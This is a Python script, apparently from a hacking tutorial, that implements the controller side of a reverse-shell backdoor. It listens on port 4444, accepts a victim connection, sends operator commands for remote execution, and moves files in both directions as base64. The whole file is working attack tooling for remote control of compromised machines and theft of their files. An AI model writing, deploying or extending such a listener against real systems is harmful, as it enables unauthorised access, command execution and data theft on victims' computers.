#!/usr/bin/env python

import base64
import json
import socket

class Listener:
    def __init__(self, ip, port):
        # Create a socket object
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set socket options to reuse the address
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind the socket to the specified IP and port
        listener.bind((ip, port))
        # Listen for incoming connections
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        # Accept a connection
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
        
    def reliable_send(self, data):
        # Convert data to JSON format and send it over the connection
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
        
    def reliable_receive(self):
        # Receive JSON data from the connection and decode it
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
                
    def execute_remotely(self, command):
        # Send the command over the connection and receive the result
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self, path, content):
        # Write the content to a file
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."
        
    def read_file(self, path):
        # Read the content of a file and encode it in base64
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
        
    def run(self):
        # Continuously receive commands from the user and execute them
        while True:
            try:
                command = input(">> ")
                command = command.split(" ")
                if command[0] == "upload":
                    # If the command is "upload", read the file and append its content to the command
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                # Execute the command remotely and get the result
                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    # If the command is "download" and there's no error, write the file
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)

# Create a listener object with the specified IP and port
my_listener = Listener("ip", 4444)
# Run the listener
my_listener.run()

